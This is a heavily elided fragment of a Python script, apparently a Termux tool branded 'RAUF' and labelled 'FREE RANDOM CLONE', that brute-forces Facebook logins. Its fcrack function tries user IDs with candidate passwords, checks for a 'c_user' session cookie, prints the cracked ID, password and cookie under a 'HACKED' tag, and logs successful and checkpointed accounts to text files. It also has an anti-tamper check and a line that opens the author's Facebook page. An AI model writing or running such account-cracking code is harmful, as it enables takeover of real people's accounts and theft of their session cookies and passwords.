...
try:
    ...
    def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           ...
           system('clear');print('System Modification Not Allowed since using RAUF');exit()
...
\033[1;37m-------------------------------------------
\033[1;37m Owner    : RAUF 
\033[1;37m Facebook : ...
\033[1;37m Github   : Not Use
\033[1;37m Tool/Type: FREE RANDOM CLONE
\033[1;37m Version  : \033[1;92m1.2
\033[1;37m--------------------------------------------""")
...
try:
    ...
    os.system("xdg-open https://facebook.com/THI.RAUF.SAAB.302")
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[RAUF-🔥HACKED] '+uid+'|'+ps+'\033[0;97m\n[‎‎💥]\033[0;94m [\033[0;0mCOOKIE\033[0;97m] \033[1;97m'+coki+  '  ''  \033[0;97m')
                open('RAUF-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
                ...
                open('RAUF-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\x1b[1;97m [\033[1;97m-RAUF🔥\033[1;97m] %s|\x1b[1;92mOK: %s \x1b[1;97m\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
